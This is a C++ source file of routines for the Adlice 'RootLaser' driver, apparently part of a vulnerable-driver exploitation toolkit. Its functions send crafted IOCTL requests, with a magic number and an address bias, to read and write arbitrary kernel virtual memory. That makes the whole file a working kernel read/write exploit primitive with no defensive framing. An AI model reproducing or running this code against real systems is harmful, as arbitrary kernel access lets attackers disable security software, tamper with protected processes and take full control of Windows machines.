/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2026
*
*  TITLE:       ADLICE.CPP
*
*  VERSION:     1.31
*
*  DATE:        19 Sep 2026
*
*  Adlice driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/adlice.h"

BOOL RLaserWriteMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG Value)
{
    RLASER_WRITE_REQUEST request;

    RtlSecureZeroMemory(&request, sizeof(request));
    request.MagicNumber = RLASER_MAGIC;
    request.Padding1 = 0;

    request.BaseAddress = (DWORD64)Address - RLASER_WRITE_BIAS;
    request.Index = 0;
    request.Padding2 = 0;
    request.ValueToWrite = (DWORD64)Value;

    return supCallDriver(
        DeviceHandle,
        IOCTL_RLASER_WRITE_MEMORY,
        &request,
        sizeof(RLASER_WRITE_REQUEST),
        NULL,
        0);
}

/*
* RLaserReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory using RootLaser.
*
*/
BOOL RLaserReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    DWORD size = sizeof(RLASER_READ_REQUEST) + NumberOfBytes;
    BOOL bResult = FALSE;
    PRLASER_READ_REQUEST pRequest;

    pRequest = (PRLASER_READ_REQUEST)supAllocateLockedMemory(size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (pRequest) {

        pRequest->TargetAddress = (DWORD64)Address;
        pRequest->DataLength = NumberOfBytes;
        pRequest->Unknown = 0;

        bResult = supCallDriver(DeviceHandle,
            IOCTL_RLASER_READ_MEMORY,
            pRequest,
            size,
            pRequest,
            size);

        if (bResult)
            RtlCopyMemory(Buffer, pRequest, NumberOfBytes);

        supFreeLockedMemory(pRequest, size);
    }

    return bResult;
}

/*
* RLaserWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory using RootLaser.
*
*/
BOOL RLaserWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes
)
{
    ULONG_PTR currentAddress = Address;
    BYTE* dataPtr = (BYTE*)Buffer;
    ULONG bytesRemaining = NumberOfBytes;
    DWORD64 value;

    while (bytesRemaining > 0) {

        value = 0;
        if (bytesRemaining >= 8)
        {
            RtlCopyMemory(&value, dataPtr, sizeof(ULONG64));

            // lower bytes
            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFF)))
                return FALSE;

            // high bytes
            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress + sizeof(ULONG), (ULONG)(value >> 32)))
                return FALSE;

            bytesRemaining -= sizeof(ULONG64);
            dataPtr += sizeof(ULONG64);
            currentAddress += sizeof(ULONG64);
        }
        else
        {
            if (!RLaserReadKernelVirtualMemory(DeviceHandle, currentAddress, &value, sizeof(value)))
                return FALSE;

            RtlCopyMemory(&value, dataPtr, bytesRemaining);

            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress, (ULONG)(value & 0xFFFFFFFF)))
                return FALSE;

            if (!RLaserWriteMemoryPrimitive(DeviceHandle, currentAddress + sizeof(ULONG), (ULONG)(value >> 32)))
                return FALSE;

            bytesRemaining = 0;
        }
    }
    return TRUE;
}
